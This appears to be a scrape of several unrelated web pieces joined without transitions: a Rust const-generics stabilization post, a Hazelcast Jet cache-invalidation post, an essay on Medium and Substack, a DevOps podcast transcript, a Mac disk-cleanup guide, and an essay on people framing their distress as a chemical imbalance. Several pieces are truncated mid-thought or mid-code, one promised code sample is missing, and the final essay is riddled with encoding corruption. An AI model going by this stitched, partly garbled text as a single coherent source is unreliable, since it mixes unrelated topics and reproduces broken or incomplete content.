<p>For those who don’t know, <strong>const generics</strong> refers to generics that are constant values, rather
than types. This allows types to be parameterized by, for example, specific integer values. In
stable Rust, only the special array type - <code>[T; N]</code> - has a const parameter (the length of the
array), and there is no way to be abstract over all values of <code>N</code>, even for arrays. Const generics
will allow creating new types parameterized by values, as well as implementing traits and functions
that are abstract over those values. For example:</p>
<div><pre><code data-lang="rust"><span>// This is a custom type which is parameterized by a `usize`
</span><span></span><span>pub</span><span> </span><span>struct</span> <span>Foo</span><span>&lt;</span><span>const</span><span> </span><span>N</span>: <span>usize</span><span>&gt;</span><span> </span><span>{</span><span> 
</span><span>    </span><span>bytes</span>: <span>[</span><span>u8</span><span>;</span><span> </span><span>N</span><span>],</span><span>
</span><span></span><span>}</span><span>
</span><span>
</span><span>
</span><span></span><span>// This is a trait which has been implemented for arrays of
</span><span>// any length.
</span><span></span><span>impl</span><span>&lt;</span><span>T</span>: <span>Debug</span><span>,</span><span> </span><span>const</span><span> </span><span>N</span>: <span>usize</span><span>&gt;</span><span> </span><span>Debug</span><span> </span><span>for</span><span> </span><span>[</span><span>T</span><span>;</span><span> </span><span>N</span><span>]</span><span> </span><span>{</span><span>
</span><span></span><span>}</span><span>
</span></code></pre></div><p>We’ve been using the const generics feature to <a href="https://doc.rust-lang.org/std/primitive.array.html#implementations">implement traits for arrays</a> for over a
year, artificially limiting the implementations to arrays of length 32. We are planning to <a href="https://github.com/rust-lang/rust/pull/74060">lift
that limitation on those impls</a> in an upcoming release. By stabilizing const
generics, we could start to allow external crates to implement traits for all arrays as well, and
many other interesting use cases. There will be two important limitations, however.</p>
<h2 id="only-integral-primitive-types-for-const-generics">Only integral primitive types for const generics</h2>
<p>The initial types that a const generic can have will be limited to the integral primitive types.
That means the signed and unsigned integer types, booleans, and chars. For now, no compound or
user-defined types will be allowed, and no references (meaning no strings as well). This is a
relatively easy shortcoming of the current implementation to fix, and user defined types for const
generics will be possible in the nearer, rather than longer term.</p>
<p>I want to mention, since a lot of people aren’t aware of this, that not <em>any</em> type can be used as a
const parameter, even setting aside the current limitations of rustc. Importantly, in order for
Rust’s type system to be sound, equality between two types must be deterministic, reflexive,
symmetric, and so on. That is, if your custom type implements equality by flipping a coin, two
values of that type will sometimes be equal to one another and sometimes not. This will mean, two
types parameterized by those values will sometimes be the same type and sometimes a different type.
This would be quite troubling for the type system.</p>
<p>(As a concrete example, floating point numbers present challenges with the fact that <code>Foo&lt;NaN&gt;</code>, for
example, would not be considered the same type as itself, because <code>NaN</code> is not equal to itself.)</p>
<p>The long term solution to this is a notion of “structural equality,” which is a strictly correct
subset of <code>Eq</code> types that meet the properties needed for use in the type system. Rust already uses
this structural equality property when implementing matching. If you derive Eq and PartialEq for
your type and all its members, it should meet the structural equality property needed to be used in
matches and const generics.</p>
<h2 id="no-complex-expressions-based-on-generic-types-or-consts">No complex expressions based on generic types or consts</h2>
<p>The other limitation will be that only two kinds of expressions can be used to fill in a const
generic position:</p>
<ol>
<li>A const generic parameter. For example, in an <code>impl&lt;const N: usize&gt;</code>, where an const generic has
been introduced, that value can be used literally to fill a const generic.</li>
<li>An expression that can be used in a const context which does not depend on any type or const
parameters. This means literals, math equations, using consts, calling const fns, etc, as long
as no free generics are involved.</li>
</ol>
<p>This limits a lot of the more exotic and interesting things users want to do with const generics.
You can’t, for example, combine two array lengths together to form an array with type
<code>[T; N + M]</code>, or even double an array length with <code>[T; N * 2]</code>. You basically can’t have a type
that depends on computation that depends on other generics. Implementing this behavior soundly and
correctly is really the hard part of implementing const generics, and while work is ongoing, it
isn’t ready yet.</p>
<p>This also means that const generics can’t be filled in based on associated types, associated consts,
or generic methods. No functions that return <code>[u8; mem::size_of::&lt;T&gt;()]</code>, no use of <code>Self</code> like
<code>[u8; Self::LEN]</code>, etc.</p>
<p>This will mean, for example, that use cases like cryptographic hash traits which allow each
implementation to specify a different length for the hash they output will still be out of scope for
the MVP. This is a shame, but this feature will come eventually.</p>
<h2 id="what-you-will-be-able-to-do">What you <em>will</em> be able to do</h2>
<p>All of these restrictions might sound like the feature is pretty limited, but I think users will
find a lot of really powerful use cases for it once they can play around with it. For one thing,
traits that today might be implemented only by some array types, or not at all, will begin to be
implemented by all arrays, making arrays a much more first class part of the language. And <a href="https://github.com/rust-lang/rust/pull/74373">we’re
already finding awesome use cases</a>. Look at this code sample.</p>

<h2 id="next-steps">Next steps</h2>
<p>Now that we’ve worked out what we could stabilize in the near future, I am working up hype and
consensus aroud the vision of stabilizing this feature - that’s what this blog post is for! The next
steps will be for someone to carve out a feature gate which is this limited set of const generics
(as opposed to the existing whole <code>const_generics</code> feature gate) and then for us to go through the
standard procedure for documenting and stabilizing that feature gate.</p>
<h2 id="credit">Credit</h2>
<p>My own involvement in const generics between the RFC and now has been minimal to non-existent.
Essentially, my role (both in the RFC and now) has been to identify a scope we can get consensus on
moving forward with. However, the hard work of implementing const generics has been going on for
years in between then, and I want to credit especially the contributors <a href="http://github.com/eddyb">eddyb</a>,
<a href="https://github.com/varkor">varkor</a>, <a href="https://github.com/lcnr">lcnr</a>, and <a href="https://github.com/oli-obk">oli-obk</a> for their work on implementing this highly
requested feature.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><p><span><p>It has been said that there are two things hard in software development,
naming things and cache invalidation (while some add off-by-one errors
to the mix).
I believe that keeping the cache in sync with the source of truth might
count as a third one.
In this post, I'd like to tackle this issue, describe the ideal
situation -
1 cache, 1 datastore, describe the problem of having multiple components
that can write to the datastore, list all possible solutions, and
describe one elegant solution based on Change Data Capture and Jet.</p>
<h2>The ideal design</h2>
<p>In a system, to improve performance, one of the first short-term
measures is to set up a cache.
It's a tradeoff between getting the data faster at the cost of the data
being not that fresh: one loads the data in-memory close to the
consumer, and presto, one gets an instant performance boost. In regard
to a database, this is akin to the following:</p>
<p><img src="https://jet-start.sh/blog/assets/2020-07-16-starting-architecture.svg" alt="Starting architecture"></p>
<p>In this read-through design, when the app requires an item, the cache
first checks whether it has it.
If yes, it returns it.
If not, it fetches it from the underlying Relational Database Management
System, stores it, and returns it.
For a write, it stores it, and also calls the RDBMS to store it.</p>
<p>Note that using a cache-aside design instead of read-through would have
the same issue.
The only difference would be the fact that the app would be responsible
for the fetching/storing logic instead of the cache.</p>
<p>The RDBMS is the sole source of truth - as it should be. Since the cache
intercepts write statements to the RDBMS, it's a mirror of the data.</p>
<h2>Handling third-party database updates</h2>
<p>This design works as expected until the database receives updates from
another source:</p>
<p><img src="https://jet-start.sh/blog/assets/2020-07-16-updating-database-bypassing-cache.svg" alt="Updating the database while bypassing the
cache"></p>
<p>Now, the RDBMS is still the source of truth, but the cache is not aware
of changes made by other components.
Hence, it might (will) return data that it has stored, but that is stale
compared to what is the source of truth in the RDBMS.</p>
<p>There are multiple ways to cope with this issue.</p>
<h3>Cache invalidation</h3>
<p>Since the cache only queries the RDBMS if it doesn't store the requested
item, let's remove items after a specific time.
This is a built-in feature in enterprise-grade caches such as Hazelcast
IMDG, and it is known as the Time-To-Live.
When an item is stored, a TTL can be attached to it.
After that time has elapsed, the item is removed from the cache, and it
will be fetched from the RDBMS again if needed.</p>
<p>This approach has a couple of downsides:</p>
<ol>
<li>If an item is not updated in the RDBMS, but is evicted from the
cache, then there's an extra query from the cache to the RDBMS when it's
needed by the app.
This is a net loss of resources.</li>
<li>If an item is updated in the RDBMS, but its TTL has not been reached
yet, then the cache will return the stale data.
This defeats the purpose.</li>
</ol>
<p>With longer TTL, we avoid unnecessary round trips but return more stale
data.
With shorter TTL, we waste resources with lesser chances of stale data.</p>
<h3>Polling the RDBMS</h3>
<p>Because the TTL doesn't seem to be the right approach, we could devise a
dedicated component that watches the RDBMS by regularly sending queries
to it and updating the cache accordingly.</p>
<p>Unfortunately, this strategy incurs the same issues as cache
invalidation:
the more frequent the queries, the more chances to catch changes, but
the more resources are wasted.
Worse, this also will put extra load on the RDBMS.</p>
<h3>RDBMS triggers</h3>
<p>A common downside of the above approaches is the way they both poll the
database.
Polling happens with a specific frequency, while writes don't follow any
regular periodicity.
Thus, it's not possible to make the two match.</p>
<p>Instead of polling, it would make much more sense to be event-driven:</p>
<ol>
<li>if no writes happen, there's no need to update the cache</li>
<li>if a write happens, then the relevant cache item should be updated
accordingly</li>
</ol>
<p>In RDBMS, this event-driven approach is implemented via <em>triggers</em>.
Triggers are dedicated stored procedures that are launched in response
to specific events, such as an <code>INSERT</code> or an <code>UPDATE</code>.</p>
<p>That works pretty well when the acted-upon object is inside the database
<em>e.g.</em> "when a record of table A is updated, then add a record to table
B".
For our use-case, where the acted-upon object is the cache, which sits
outside the database, it's not as simple.
For example, MySQL allows you to <a href="https://dev.mysql.com/doc/refman/8.0/en/faqs-triggers.html#faq-mysql-can-triggers-udf">make an external system call from a
trigger</a>.
However, this approach is very implementation-dependent and makes the
overall design of the system much more fragile.
Also, only some RDBMS implement triggers. Even if they do, there's no
standard implementation.</p>
<h2>Change Data Capture</h2>
<p>Wikipedia defines Change Data Capture (or CDC) as:</p>
<blockquote>
<p>[...] a set of software design patterns used to determine and track
the data that has changed so that action can be taken using the
changed data.</p>
<p>CDC is an approach to data integration that is based on the
identification, capture and delivery of the changes made to enterprise
data sources.</p>
</blockquote>
<p>In practice, CDC is a tool that allows to transform standard write
queries into events.
It implements it by "turning the database inside-out" (quote from Martin
Kleppmann).
This definition is because a database keeps a record of all changes in
an implementation-dependent append-only log.
Regularly, it uses it to manage its state. Some RDBMS also have other
usage <em>e.g.</em> MySQL uses the log for replication across nodes.</p>
<p>For example, here's a sample for MySQL binlog:</p>
<pre><code>### UPDATE `test`.`t`
### WHERE
###   @1=1 /* INT meta=0 nullable=0 is_null=0 */
###   @2='apple' /* VARSTRING(20) meta=20 nullable=0 is_null=0 */
###   @3=NULL /* VARSTRING(20) meta=0 nullable=1 is_null=1 */
### SET
###   @1=1 /* INT meta=0 nullable=0 is_null=0 */
###   @2='pear' /* VARSTRING(20) meta=20 nullable=0 is_null=0 */
###   @3='2009:01:01' /* DATE meta=0 nullable=1 is_null=0 */
# at 569
#150112 21:40:14 server id 1  end_log_pos 617 CRC32 0xf134ad89
#Table_map: `test`.`t` mapped to number 251
# at 617
#150112 21:40:14 server id 1  end_log_pos 665 CRC32 0x87047106
#Delete_rows: table id 251 flags: STMT_END_F
</code></pre>
<p>A CDC component connects to this immutable log to extract change events.</p>
<p>One can view CDC as the opposite of Event Sourcing:
the latter captures state by aggregating events, while the former
extracts events "from the state".</p>
<h2>Debezium</h2>
<p>CDC is quite recent, and hasn't had time to mature.
As such, there's no universal standard, but specific tools.
In this section, we are going to have a look at
<a href="https://debezium.io/">Debezium</a>.
Debezium is an Open Source set of services for CDC provided by Red Hat.</p>
<p>Debezium is an umbrella term covering several components:</p>
<ol>
<li>Debezium Connectors are specific bridges that read the append-only
proprietary log for each supported database.
For example, there’s a connector for MySQL, one for MongoDB, one for
PostgreSQL, etc.</li>
<li>Each connector is also a Kafka Connect Source Connector:
this allows to easily output CDC events to one’s Kafka cluster</li>
<li>Finally, the Debezium Engine is a JAR that allows Debezium to be
embedded in one’s applications.
Note that even in that case, Debezium produces Kafka Connect-specific
content, which then needs to be handled and transformed in one’s
application.</li>
</ol>
<p>While Kafka is a great technology, and probably also quite widespread
nowadays, data in Kafka needs to be persisted to disk.
The benefit of persistence is that data survive even in the event of the
cluster going down.
The tradeoff, however, is that the access time of disk-persisted data is
one (or 2) orders of magnitude slower than the access time of in-memory
data, depending on the underlying disk technology.</p>
<h2>Hazelcast Jet</h2>
<p><a href="https://jet-start.sh/">Hazelcast Jet</a> is a distributed stream
processing framework built on Hazelcast and combines a cache with
fault-tolerant data processing.
It has sources and sinks to integrate with several file, messaging and
database systems (such as Amazon S3, Kafka, message brokers and
relational databases).</p>
<p>Jet also provides a Debezium module where it can process change events
directly from the database, and write them to its distributed key-value
store.
This avoids having to write the intermediate messages to Kafka and then
read again to be written to a separate cache.</p>
<h2>Putting it all together</h2>
<p>It’s (finally!) time to assemble all the previous bits together.
Here are the components and their responsibilities:</p>
<ol>
<li>A MySQL database instance is where the data is stored.
It’s accessed in read-only mode by the cache, and in write-only mode by
some external component</li>
<li>A Jet instance reads events to MySQL through the Debezium connector,
transforms them into cache-compatible key-value pairs, and updates the
cache accordingly.
Note that while Jet pipelines provide filtering capabilities, it’s also
possible to filter items in the CDC connector to optimize load of the
pipeline</li>
<li>The app uses the cache, which is always up-to-date with the database,
give or take the time it takes for the above to execute</li>
</ol>
<p><img src="https://jet-start.sh/blog/assets/2020-07-16-architecture-with-cdc.svg" alt="Final architecture with
CDC"></p>
<p>Note that this architecture assumes one starts from a legacy state, with
an existing app that uses caching, where later on a new component was
set up that could update the database.</p>
<p>If one starts from scratch, it’s possible to simplify the above diagram
(and associated code) as Jet embeds its own Hazelcast instance.
In that case, instead of Jet being a client of a third-party Hazelcast
instance, Jet is the one to configure and start the instance.
Obviously, it also can then get/put data.</p>
<h2>Talk is cheap, show me the code</h2>
<p>Sources for this post are available <a href="https://github.com/hazelcast-demos/evergreen-cache">on
GitHub</a>.</p>
<p>The repository is made of the following modules:</p>
<ul>
<li><code>app</code> is a Spring Boot application using Spring Data JDBC to access a
MySQL database.
It abstracts away Hazelcast by using a Spring Cache layer</li>
<li><code>update</code> is a Spring Shell application.
It allows to update the data inside the database, with the cache none
the wiser</li>
<li><code>pipeline</code> is the Jet pipeline that listens to CDC events and update
the cache when data is updated</li>
</ul>
<p>The pipeline definition is quite straightforward:</p>
<pre><code>pipeline<span>.</span><span>readFrom</span><span>(</span>source<span>)</span>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>

<p>Medium was beautiful when it first launched. The <span>WYSIWYG</span> editor blew my mind. Ads didn’t cover the first three paragraphs. It’s where all the cool kids published.</p>
<p>Reading an article on Medium felt like getting an email from an @gmail.com address in 2004. <em><span></span><span>“</span>This person must know what’s up, they’re on Medium!”</em></p>
<p>The content was great. There were fantastic Federal Reserve breakdowns and Apple iPhone hot takes.</p>
<p>But when I land on Medium posts now, I find myself discounting the articles before I even read them. Perhaps it’s that every article has the same little M in the top left, the same h1 size and font and color, the same you’ve-reached-your-reading-limit pop-up. Perhaps it’s the fact that Jeff Bezos’ dick pic post lives next to JavaScript framework flamewars. Whatever the case, Medium’s layout no longer magnifies an aura of<span></span> <span>“</span>expertness” for its authors.</p>
<p>Substack feels a lot like Medium’s early days. It’s great they’ve made newslettering easy. I love reading blogs. But as the number of Twitter bios with Substack subdomains grows, my eagerness to click through is shrinking.</p>
<p>The problem is twofold.</p>
<p>First, there’s a signal problem.</p>
<p>Medium used to amplify credibility. Now I find the opposite to be true for me. <em><span></span><span>“</span>Oh this person just throws stuff on Medium? Probably not worth my time.”</em> X-out.</p>
<p>Second, there’s a visual memory problem.</p>
<p>I’m a sucker for unique <span>CSS</span>. As pretentious as that sounds, it’s not a conscious judgment. Daring Fireball’s grey background is soothing. The big green Marginal Revolution monster is endearing. It’s easy to find Paul Graham’s article in my tabs: it’s the only Yahooo! favicon.</p>
<p>Substack’s (and Medium’s) locked layouts mean I look past the author, read the post, and then move on. It’s similar to Spotify’s Discover Weekly. Despite listening to the playlist on repeat, I can’t name a single artist from it.</p>
<p>People who already have a huge audience will likely succeed massively with Substack. The experience is easy. It’s thoughtful. It’s simple. Lowering the bar for online publishing is fantastic. I am cheering for them.</p>
<p>But I hope I don’t find myself groaning when I click on Substack links.</p>
<p>Medium became a victim of its own success. Too much noise, not enough signal. I wonder how Substack can avoid the same fate.</p>

I'm Daniel Bryant. I'd like to welcome you to the Ambassador Livin' on the Edge Podcast, the show that focuses on all things related to cloud-native platforms, creating effective developer workflows, and building modern APIs. Today I'm joined by Dave Sudia, senior DevOps engineer at GoSpotCheck.</p><p>Daniel (00:18):</p><p>I've been following Dave's work for the past couple of years. I was lucky enough to get to see in person his presentation with colleague, Toni Rib, at KubeCon San Diego last year, where they focused on the GoSpotCheck move from Heroku onto Kubernetes. After the presentation, Dave dropped by the Datawire booth. My colleague Rafi and I had a great chat with him. He clearly understood both the theory and the practicality of building a platform for an organization that is constantly evolving. Rafi and I learned a bunch.</p><p>Daniel (00:42):</p><p>Today we're talking about how Dave and his team at GoSpotCheck have focused on enabling engineers to develop apps effectively in a local development environment, assembling a PaaS-like Kubernetes platform with open-source components, particularly CNCF components, and enabling self-service around the bigger picture of API contract testing, infrastructure provisioning and deployment. Hello, Dave, and welcome to the Livin' on the Edge Podcast. Thanks for joining us today.</p><p>Dave (01:03):</p><p>Thanks for having me.</p><p>Daniel (01:04):</p><p>Could you briefly introduce yourself for the listeners and share a recent career highlight as well, please?</p><p>Dave (01:09):</p><p>Yeah. I'm Dave Sudia. I'm a senior DevOps engineer at GoSpotCheck. We're a startup based in Denver, Colorado. I think the career highlight was being on Deserted Island DevOps conference that happened in Animal Crossing a couple months ago.</p><p>Daniel (01:24):</p><p>Awesome.</p><p>Dave (01:25):</p><p>I don't know that I'm ever going to top that. That was super fun. It was put together by Austin Parker, who's in dev relations at LightStep. We went to his island in Animal Crossing and he had this crazy open broadcast studio set up, where we were talking in Zoom and he overlaid our audio onto the capture from his Switch, so you could watch us presenting in Animal Crossing. If you haven't seen it, I'll send you a link. It was just the most fun, wacky, thing. It was great.</p><p>Daniel (01:53):</p><p>Fantastic. You and I chatted quite a bit in San Diego last year at KubeCon, where you presented with your colleague, Toni Rib, Balancing Power and Pain: Moving a Startup From a PaaS to Kubernetes. I learned a bunch from that talk. Fantastic talk. We then caught up on the InfoQ Podcast and went a bit deeper into those topics. I'm guessing today really is part three of our discussion, but I was thinking for today, it'd be good to set a context for listeners of the GoSpotCheck platform, but then dive a bit more into the evolution of the platform, because I think you famously said you were assembling components versus building a platform, they're very different things, which I agree with. I think you've got some really great insight there.</p><p>Daniel (02:28):</p><p>Just to set the context, was running the GoSpotCheck app on a PaaS a good experience in the early years?</p><p>Dave (02:36):</p><p>Yeah. To recap, we started on Heroku. We ran there for many years. We were one of their largest customers by the time we started moving off. Their product is great. There are many things that we still miss about their product that we're now trying to rebuild internally. That is where I think most people should start, whether it's App Engine or Beanstalk or Heroku or any of those other more PaaS-type offerings. I think the thing I said in the last one is when you start there, you don't need my team. That's where your money is going, you're saving that economy of having to have a bunch of people who really understand how operations work. But at a certain point, you're going to get to a point where you need someone who really understands how operations work. You need features that aren't being offered by those platforms. Then you got to move.</p><p>Dave (03:29):</p><p>We shifted to Google Kubernetes engine as the primary place our apps landed, but what you lose is a lot of the sugar of a platform as a service. You lose the ease and the convenience. Last November, we had a hackathon. One of our lead developers, who runs a team, came up and said, "I don't really know exactly what I'm going to be doing for this hackathon, but it's going to be making this easier. This is all too hard." I heard that loud and clear. Making Kubernetes Easier was Bryan Liles' keynote at KubeCon last year. It’s not like it's going to get fixed in a hackathon.</p><p>Dave (04:13):</p><p>That's our push this year. We glued a bunch of tools together. How do we turn them into a more cohesive experience? It's never going to provide the convenience of git push Heroku master for a number of reasons, but how do we provide something that is just better, a little more seamless, a little easier to use?</p><p>Daniel (04:32):</p><p>Nice. Just take a step back. Initially the reason you looked at moving off Heroku was purely scale, I think, wasn't it?</p><p>Dave (04:39):</p><p>Yeah. It was scale and because of scale, feature. One of the big drivers was we used all their postgres instances and we just got to a point where the way that our queries were running, the performance characteristics of their databases just could not keep up with what we needed. We needed to shift our databases off. Then it was a cost perspective. When you're paying for my team, you shouldn't also be paying for Heroku. Then you're spending way too much.</p><p>Daniel (05:10):</p><p>Makes total sense. You mentioned assembling the …</p></div></main></div></div></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
        

        

        

<p>I recently needed to clear a large amount of space on my Mac's hard drive in
order to install Windows through <a href="https://en.wikipedia.org/wiki/Boot_Camp_(software)">Boot
Camp</a>. After deleting files
and applications, I still had large amounts of space taken up in ways that I
didn't understand. Here is what I did to fix the problem.</p>
<h2 id="easy-methods">Easy Methods<a aria-label="Anchor" href="#easy-methods"><svg><use xlink:href="/images/icons.svg#icon-link"></use></svg></a></h2>
<p>The obvious thing to start with was deleting known files and applications. In
particular, I removed some built-in macOS applications, like GarageBand, that I
can always re-download from the Mac App Store.</p>
<p>I also cleared the trash. As a tip, you probably want to set it to
<a href="https://support.apple.com/guide/mac-help/delete-files-and-folders-on-mac-mchlp1093/mac">automatically delete items after 30
days</a>.
I don't understand why that's considered an advanced feature in Finder when it
seems like it should be the default setting. It <a href="https://osxdaily.com/2017/02/10/automatically-empty-trash-mac/">wasn't even an
option</a> until
<a href="https://en.wikipedia.org/wiki/MacOS_Sierra">Sierra</a>.</p>
<p>Then I went into my Google Backup and Sync (for <a href="https://www.google.com/drive/">Google
Drive</a>) settings and <a href="https://www.remosoftware.com/info/how-to-configure-google-drive-sync-settings-to-sync-specific-folders-or-file-types">unsynced some
folders</a>
that I don't need to be available locally.</p>
<h2 id="other-storage">Other Storage<a aria-label="Anchor" href="#other-storage"><svg><use xlink:href="/images/icons.svg#icon-link"></use></svg></a></h2>
<p>After those easy wins, I wanted to get a better idea of what was taking up
space. macOS has a built in storage analyzer, but it's pretty basic. The
overview gives a rough breakdown.</p>
<p><img src="https://i.imgur.com/ZbajDJM.png" alt="macOS storage overview"></p>
<p>Clicking manage gives you a more detailed view.</p>
<p><img src="https://i.imgur.com/Jl509hi.png" alt="macOS storage management"></p>
<p>But note that “System” is greyed out! There's no way to drill down into it to
see what's actually taking up space.</p>
<p>This was on <a href="https://en.wikipedia.org/wiki/MacOS_Mojave">Mojave</a>.  At least
<a href="https://www.apple.com/macos/catalina/">Catalina</a> splits it up into “System” and
“Other,” though you still can't drill down into either.</p>
<h2 id="disk-space-analysis-programs">Disk Space Analysis Programs<a aria-label="Anchor" href="#disk-space-analysis-programs"><svg><use xlink:href="/images/icons.svg#icon-link"></use></svg></a></h2>
<p>I'm familiar with using <code>du -sh</code> in the terminal to show folder sizes, but I
thought a GUI program might be better for this task. I looked into third party
programs to find out what folders and files were taking up space. The first one
I tried was <a href="http://www.derlien.com/">Disk Inventory X</a>.</p>
<p>It was useful but took a while (around 10 minutes) to produce results.</p>
<p><img src="https://i.imgur.com/VW6aebM.png" alt="Disk Inventory X results"></p>
<p>I looked into alternatives. The most helpful resources were this <a href="https://apple.stackexchange.com/q/81568/275342">Stack Exchange
question</a> and this
<a href="https://macpaw.com/how-to/best-disk-space-analyzers-mac">article</a>.</p>
<p>I tried <a href="https://www.omnigroup.com/more">OmniDiskSweeper</a>. It doesn't have a
tree view like Disk Inventory X does, but I didn't find that very useful anyway.
OmniDiskSweeper was able to show results as they came, rather than all at once
at the end.</p>
<p><img src="https://i.imgur.com/t9N8zcf.png" alt="OmniDiskSweeper results"></p>
<p>It doesn't update in real time, so I did have to re-analyze the disk after
deleting files.</p>
<h2 id="docker">Docker<a aria-label="Anchor" href="#docker"><svg><use xlink:href="/images/icons.svg#icon-link"></use></svg></a></h2>
<p>The first thing I noticed was Docker's <a href="https://docs.docker.com/docker-for-mac/space/">disk image
file</a>. Docker for Mac stores
containers and images in that single, large file. I ran <a href="https://docs.docker.com/engine/reference/commandline/system_prune/">docker system
prune</a> to
delete unnecessary containers and images.</p>
<p>Then I decreased the size limit for the disk image file.</p>
<p><img src="https://i.imgur.com/FNrnAtf.png" alt="Docker disk image size"></p>
<h2 id="spotify">Spotify<a aria-label="Anchor" href="#spotify"><svg><use xlink:href="/images/icons.svg#icon-link"></use></svg></a></h2>
<p>The biggest surprise to me was discovering that Spotify can take a large amount
of space to cache files. Mine was over 6 GB. Even Firefox's cache was only 2 GB.</p>
<p><img src="https://i.imgur.com/4oUnYL7.png" alt="Spotify cache size"></p>
<p>Furthermore, there doesn't seem to be a way to control this cache size in
Spotify settings, not even buried in some advanced settings. This setting <a href="https://community.spotify.com/t5/Social/What-happened-to-the-cache-limit-setting-on-Mac-desktop-player/td-p/4658524">might
have existed
before</a>,
but it doesn't now. Luckily, <a href="https://community.spotify.com/t5/Desktop-Mac/How-to-limit-cache-size/td-p/2907725">someone
discovered</a>
that you can set a limit manually by editing the Spotify preferences file at
<code>~/Library/Application\ Support/Spotify/prefs</code> and adding a line like
<code>storage.size=2048</code>.</p>
<p>I set the limit to 2048 MB, restarted Spotify, and confirmed that the cache
folder dropped to the expected size, saving me over 4 GB.</p>
<div><pre><code data-lang="sh">$ du -sh ~/Library/Caches/com.spotify.client/Data
6.4G    Data

<span># restart Spotify</span>

$ du -sh ~/Library/Caches/com.spotify.client/Data
2.0G    Data
</code></pre></div><h2 id="yarn">Yarn<a aria-label="Anchor" href="#yarn"><svg><use xlink:href="/images/icons.svg#icon-link"></use></svg></a></h2>
<p><a href="https://yarnpkg.com/">Yarn</a> seemed to have old cache folders.</p>
<div><pre><code data-lang="sh">$ cd ~/Library/Caches/Yarn <span>&amp;&amp;</span> ls
v2 v4 v6

$ du -sh v2 v4 v6
  0B    v2
1.2G    v4
1.2G    v6

$ yarn cache dir
/Users/dguo/Library/Caches/Yarn/v6
</code></pre></div><p>I deleted the v2 and v4 folders. My cache is fairly small, but <a href="https://github.com/yarnpkg/yarn/issues/6037">other
people</a> have ended up with gigantic
caches.</p>
<h2 id="git">Git<a aria-label="Anchor" href="#git"><svg><use xlink:href="/images/icons.svg#icon-link"></use></svg></a></h2>
<p>I found some <a href="https://git-scm.com/">Git</a> repositories that I didn't need
anymore. Deleting these saved around 1 GB in total. Git repos can take up a
large amount of space since by default, they contain the entire history of a
project. Though in my case, most of the space savings was due to deleting
<code>node_modules</code> with each one.</p>
<h2 id="conclusion">Conclusion<a aria-label="Anchor" href="#conclusion"><svg><use xlink:href="/images/icons.svg#icon-link"></use></svg></a></h2>
<p>For years, I've used <a href="https://freemacsoft.net/appcleaner/">AppCleaner</a> to
uninstall applications because I knew most of them leave files behind if you
only delete the application itself. This experience reminded me that when I
install an application, I generally have no idea where it's going to write files
and how large they can get. It would be nice if operating systems could make it
easier for users to be more in control of hard drive usage, instead of letting
applications treat the hard drive like an unlimited resource.</p>

She was â€˜crying all the timeâ€™, struggled to attend her university classes, slept a lot and avoided situations she normally enjoyed.</p><p>In recounting her emotional reaction, Jenna stressed to me its unreasonableness. Given that she and her boyfriend hadnâ€™t been dating for long, she felt that she shouldnâ€™t have been so upset. After a month, she decided that something was seriously amiss and that she needed professional help. She recalled her psychiatrist diagnosing depression and telling her the problem might be caused by a chemical imbalance in her brain, for which she was prescribed an antidepressant.</p><p>Jenna found her emotional reactions jarring. They defied her basic assumptions about herself as confident, mature and self-sufficient. She told me she welcomed the diagnosis of a neurobiological disorder, which confirmed her problem was â€˜realâ€™ â€“ brought on by a physiological force external to her volition â€“ and that it showed sheâ€™s not â€˜just a slackerâ€™.</p><p>At the same time, Jenna was careful to distance her experience from that of people who are, in her words, â€˜crazyâ€™ or â€˜nutsâ€™. Their illness means a loss of control and ability to function. By contrast, she sees her problem as a common and minor glitch in neurochemistry. No one, she insisted, should mistake her for the mentally ill.</p><p>Jenna was one of 80 diverse volunteers that a research team at the University of Virginia and I interviewed in Chicago, Baltimore, Boston and two small cities in central Virginia. We wanted to find out how people deal with common forms of psychological distress and challenging circumstances, such as: shyness and nervousness in social situations; underperformance at work or school; struggles after the loss of a significant relationship; and disappointment with how their lives are unfolding. A majority of our interviewees had received some form of psychotherapy and/or been diagnosed with a condition such as depression, social anxiety disorder or attention deficit disorder, and prescribed a psychiatric medication.</p><p>It was striking that many (though not all) at least partly explained their distress in terms of biological causes, particularly a neurochemical imbalance. Yet thinking of their problems in this way was a fraught process. Like Jenna, many interviewees sharply distinguished themselves from the mentally ill and cast the mentally ill in a very negative light. This stigmatising of people with serious mental illness wasnâ€™t based on any first-hand experiences; rather, it was motivated by a desire to protect their own dignity and social standing. To justify the distinction between their own situation and mental illness, our interviewees rejected the idea that they had an â€˜illnessâ€™ as such, detached themselves from any formal diagnosis using statements such as â€˜thatâ€™s what the doctor calls itâ€™ or, in some cases, they avoided seeking medical help altogether.</p><p>For people like Jenna, who embraced a neurobiological explanation for their problems, this created a conundrum, which many of them resolved by creating a separate classification for their own experience â€“ what I have called a â€˜third conditionâ€™. The people we spoke to did not give this â€˜conditionâ€™ a name or explicit meaning. Rather it emerged in the rhetorical space opened up by the way they framed their personal struggle, distinguishing it from mental illness, on the one hand, and normality, on the other.</p><p><strong>Consider the perspective</strong> of another of our interviewees, a young woman Iâ€™ll call Piper, who had been diagnosed with depression. When â€˜you think mental illnessâ€™, according to Piper, â€˜you think schizophrenia and crazy people, and Iâ€™m not crazy, I just get really nervous.â€™ In making this distinction, interviewees like Piper and Jenna not only claimed that they were less impaired than the seriously mentally ill, they also insisted that their experience was categorially different. Piper said of herself that biologically something is just â€˜a little offâ€™. She has â€˜too little or too much or whatever it is that makes you have these issuesâ€™. Distinct from â€˜crazy peopleâ€™, she has control over her mind and her story. All she needs is a little pill. Yet at the same time, her â€˜conditionâ€™ is also different from the mundane challenges that normal people might face. Piper was adamant that her nervousness in social situations is different from ordinary shyness. Her taking of medication is warranted. She has a third condition caused by an â€˜imbalanceâ€™.</p><p>The â€˜crazy peopleâ€™ are shadowy, depersonalised figures â€“ the damaged, uncontrolled â€˜otherâ€™ </p><p>To reconcile their perspective with the fact that they had received a psychiatric diagnosis, many interviewees credited a medical professional or a confidant for suggesting something like this third condition idea to them. Others emphasised the ordinariness of their experience and compared it to the types of routine problems that regular physicians treat. As one interviewee put it, â€˜all you have to do is take a pillâ€™.</p><p>There are echoes here of the messages conveyed in direct-to-consumer advertising for psychiatric medication. Iâ€™ve analysed the content of these adverts and found that distress, as listed in symptoms and portrayed in the patientsâ€™ stories, is often presented as a â€˜real medical conditionâ€™ and yet unlike mental illness. The ads contain no references to psychiatrists or to the diagnostic manual of mental disorders from the American Psychiatric Association (APA), nor use of phrases such as 